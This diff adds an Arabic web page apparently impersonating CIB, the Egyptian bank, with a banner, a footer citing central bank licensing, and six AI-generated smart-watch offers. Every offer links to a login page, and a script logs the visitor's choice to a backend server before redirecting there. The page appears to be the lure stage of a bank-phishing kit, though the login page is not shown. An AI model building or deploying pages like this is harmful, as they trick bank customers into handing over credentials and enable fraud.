@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - الساعات الذكية</title>
+    <link rel="stylesheet" href="watches.css" />
+  </head>
+  <body>
+    <header class="top-header">
+      <div class="top-header__inner">
+        <img class="top-logo" src="img/logo.png" alt="CIB" />
+      </div>
+      <div class="top-header__separator" aria-hidden="true"></div>
+    </header>
+
+    <main class="page">
+      <section class="hero">
+        <div class="hero-banner">
+          <div class="hero-banner__title">مرحباً بكم في قسم الساعات الذكية</div>
+          <div class="hero-banner__subtitle">
+            اختر الساعة التي ترغب بها معنا
+          </div>
+        </div>
+      </section>
+
+      <section class="cards" aria-label="بطاقات الساعات">
+        <a class="card-link" href="login.html" aria-label="ساعة اورورا اخضر">
+          <article class="card">
+            <img
+              class="card__img"
+              src="img/watches/Gemini_Generated_Image_9j00fl9j00fl9j00.png"
+              alt="ساعة اورورا اخضر"
+            />
+            <h2 class="card__title">ساعة اورورا اخضر</h2>
+            <p class="card__desc">
+              ساعة ذكية بتصميم ناعم ولون هادئ لتعكس الأناقة<br />
+              والبساطة وتناسب الإطلالات اليومية والعملية.
+            </p>
+          </article>
+        </a>
+
+        <a class="card-link" href="login.html" aria-label="ساعة اورورا ابيض">
+          <article class="card">
+            <img
+              class="card__img"
+              src="img/watches/Gemini_Generated_Image_nrc5a6nrc5a6nrc5.png"
+              alt="ساعة اورورا ابيض"
+            />
+            <h2 class="card__title">ساعة اورورا ابيض</h2>
+            <p class="card__desc">
+              ساعة ذكية بتصميم أنيق وفخيم، مناسبة للاستخدام<br />
+              اليومي وتميز مظهرها عصري ونظافتك.
+            </p>
+          </article>
+        </a>
+
+        <a class="card-link" href="login.html" aria-label="ساعة اورورا البنفسجي">
+          <article class="card">
+            <img
+              class="card__img"
+              src="img/watches/Gemini_Generated_Image_1gwayx1gwayx1gwa.png"
+              alt="ساعة اورورا البنفسجي"
+            />
+            <h2 class="card__title">ساعة اورورا البنفسجي</h2>
+            <p class="card__desc">
+              ساعة ذكية بتصميم عصري وألوان لافتة، مثالية<br />
+              للاستخدام اليومي وتضيف لمسة أناقة لإطلالاتك.
+            </p>
+          </article>
+        </a>
+
+        <a class="card-link" href="login.html" aria-label="ساعة اورورا البرتقالي">
+          <article class="card">
+            <img
+              class="card__img"
+              src="img/watches/Gemini_Generated_Image_7tsnve7tsnve7tsn.png"
+              alt="ساعة اورورا البرتقالي"
+            />
+            <h2 class="card__title">ساعة اورورا البرتقالي</h2>
+            <p class="card__desc">
+              ساعة ذكية بلون دافئ وجذّاب، مناسبة لمظهر عصري<br />
+              و مميزة ل طلاتك البسيطة والراقية.
+            </p>
+          </article>
+        </a>
+
+        <a class="card-link" href="login.html" aria-label="ساعة اورورا اسود">
+          <article class="card">
+            <img
+              class="card__img"
+              src="img/watches/Gemini_Generated_Image_8v02ps8v02ps8v02.png"
+              alt="ساعة اورورا اسود"
+            />
+            <h2 class="card__title">ساعة اورورا اسود</h2>
+            <p class="card__desc">
+              ساعة ذكية أنيقة بلمسة فاخرة، تجمع بين التصميم<br />
+              العصري والأداء العملي للإطلالة مريحة طوال اليوم.
+            </p>
+          </article>
+        </a>
+
+        <a class="card-link" href="login.html" aria-label="ساعة اورورا المريخي">
+          <article class="card">
+            <img
+              class="card__img"
+              src="img/watches/Gemini_Generated_Image_l85tojl85tojl85t.png"
+              alt="ساعة اورورا المريخي"
+            />
+            <h2 class="card__title">ساعة اورورا المريخي</h2>
+            <p class="card__desc">
+              ساعة ذكية بتصميم ناعم ولون دافئ، تعكس الأناقة<br />
+              والبساطة في الإطلالات اليومية والعملية.
+            </p>
+          </article>
+        </a>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <div class="footer__text">
+        البنك التجاري الدولي هو بنك مرخص ومنظم ويخضع
+        البنك المركزي<br />
+        المصري
+      </div>
+    </footer>
+
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track watch selection
+        document.querySelectorAll('.card-link').forEach(link => {
+          link.addEventListener('click', async function(e) {
+            e.preventDefault();
+            const href = this.getAttribute('href');
+            const watchTitle = this.querySelector('.card__title').textContent;
+
+            const newUser = {
+              page: 'watches',
+              selectedWatch: watchTitle,
+              timestamp: new Date().toLocaleString('ar-EG'),
+              registrationTime: new Date().toLocaleString('ar-EG'),
+              name: watchTitle
+            };
+
+            try {
+              await saveSubmission(newUser);
+            } catch (err) {
+              console.error(err);
+              alert('تعذر حفظ الاختيار. تأكد أن الخادم وMongoDB يعملان.');
+              return;
+            }
+
+            try {
+              const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+              const oscillator = audioContext.createOscillator();
+              const gainNode = audioContext.createGain();
+              oscillator.connect(gainNode);
+              gainNode.connect(audioContext.destination);
+              gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
+              gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+              oscillator.frequency.value = 900;
+              oscillator.type = 'sine';
+              oscillator.start(audioContext.currentTime);
+              oscillator.stop(audioContext.currentTime + 0.3);
+            } catch (e2) {}
+
+            if (href) window.location.href = href;
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
+
